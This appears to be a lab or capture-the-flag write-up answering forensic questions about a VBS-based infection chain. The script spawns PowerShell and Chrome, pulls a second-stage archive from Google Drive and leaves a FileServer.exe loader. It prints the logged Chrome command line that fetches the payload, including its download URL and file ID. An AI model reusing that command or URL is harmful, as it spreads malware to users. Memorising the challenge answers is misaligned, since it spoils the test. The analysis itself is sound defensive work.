Once executed, the dropped script orchestrated the next stage by spawning multiple child processes within seconds. List the two children of wscript.exe in chronological order.

E-INVITE.vbs was executed via wscript.exe and spawn powershell.exe, chrome.exe

The next-stage payload was retrieved from a legitimate cloud-hosting service. What is the file ID embedded in that download URL? 
ID=1Yqzl-L-1FGWm4iOwieRFv9zr0urEEGWR

E-INVITE.vbs download next-stage payload from gg drive

"C:\Program Files\Google\Chrome\Application\chrome.exe" --single-argument https://drive.google.com/uc?export=download&amp;id=1Yqzl-L-1FGWm4iOwieRFv9zr0urEEGWR

After extracting the second-stage archive, the user double-clicked the loader executable. What is the full file path of the first-stage loader?

The file downloaded from gg drive was an archive named FileServer.7z (path C:\\Users\\chriskarma\\Downloads\\)
after extracting the archive, it created a excecutable file named FileServer.exe (in subforder C:\\Users\\chriskarma\\Downloads\\FileServer)